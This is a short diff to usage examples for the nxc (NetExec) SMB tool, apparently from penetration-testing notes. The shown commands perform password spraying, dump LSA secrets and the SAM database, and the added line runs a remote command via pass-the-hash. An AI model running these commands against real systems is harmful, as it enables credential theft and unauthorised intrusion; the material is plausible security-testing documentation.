@@ -19,5 +19,6 @@ Example usage:
 $ nxc smb IP -u 'username' -p password.list
 $ nxc smb IP --local-auth -u 'xxx' -p 'yyy' --lsa
 $ nxc smb IP --local-auth -u 'xxx' -p 'yyy' --sam
+$ nxc smb IP -u 'xxx' -d . -H hash -x whoami
 ```
 </div></div>
